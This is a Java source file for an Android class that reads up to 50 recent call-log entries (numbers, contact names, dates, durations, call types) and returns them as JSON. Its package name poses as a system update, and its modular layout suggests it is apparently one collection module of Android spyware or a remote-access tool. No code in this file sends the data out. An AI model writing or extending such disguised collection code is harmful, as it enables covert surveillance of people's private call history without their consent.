package com.android.system.update.modules;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallsModule {
    private Context context;
    
    public CallsModule(Context context) {
        this.context = context;
    }
    
    public String getCallLogs() {
        if (!checkPermission()) return "ERROR: No call log permission";
        
        try {
            JSONArray callsList = new JSONArray();
            ContentResolver cr = context.getContentResolver();
            
            // Fix: Use proper selection and sort order, LIMIT needs to be handled differently
            Cursor cursor = cr.query(
                CallLog.Calls.CONTENT_URI,
                null,  // projection - all columns
                null,  // selection - no filter
                null,  // selection args
                CallLog.Calls.DATE + " DESC" // sort order - no LIMIT here
            );
            
            if (cursor != null) {
                int count = 0;
                int maxResults = 50; // Limit to 50 results
                
                int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                
                // Check if indices are valid
                if (numberIdx == -1 || typeIdx == -1 || dateIdx == -1 || durationIdx == -1) {
                    cursor.close();
                    return "ERROR: Could not access call log columns";
                }
                
                while (cursor.moveToNext() && count < maxResults) {
                    JSONObject call = new JSONObject();
                    
                    // Safely get values with null checks
                    String number = cursor.getString(numberIdx);
                    call.put("number", number != null ? number : "Unknown");
                    
                    // Get contact name if available
                    if (nameIdx != -1) {
                        String name = cursor.getString(nameIdx);
                        call.put("name", name != null ? name : "");
                    }
                    
                    long date = cursor.getLong(dateIdx);
                    call.put("date", date);
                    
                    String duration = cursor.getString(durationIdx);
                    call.put("duration", duration != null ? duration : "0");
                    
                    int type = cursor.getInt(typeIdx);
                    String typeStr = "UNKNOWN";
                    if (type == CallLog.Calls.INCOMING_TYPE) typeStr = "INCOMING";
                    else if (type == CallLog.Calls.OUTGOING_TYPE) typeStr = "OUTGOING";
                    else if (type == CallLog.Calls.MISSED_TYPE) typeStr = "MISSED";
                    else if (type == CallLog.Calls.VOICEMAIL_TYPE) typeStr = "VOICEMAIL";
                    else if (type == CallLog.Calls.REJECTED_TYPE) typeStr = "REJECTED";
                    else if (type == CallLog.Calls.BLOCKED_TYPE) typeStr = "BLOCKED";
                    
                    call.put("type", typeStr);
                    
                    // Add formatted date for easy display
                    java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    String formattedDate = sdf.format(new java.util.Date(date));
                    call.put("formatted_date", formattedDate);
                    
                    callsList.put(call);
                    count++;
                }
                
                cursor.close();
            }
            
            // Return as JSON array string - no prefix needed
            return callsList.toString();
            
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
            == PackageManager.PERMISSION_GRANTED;
    }
}
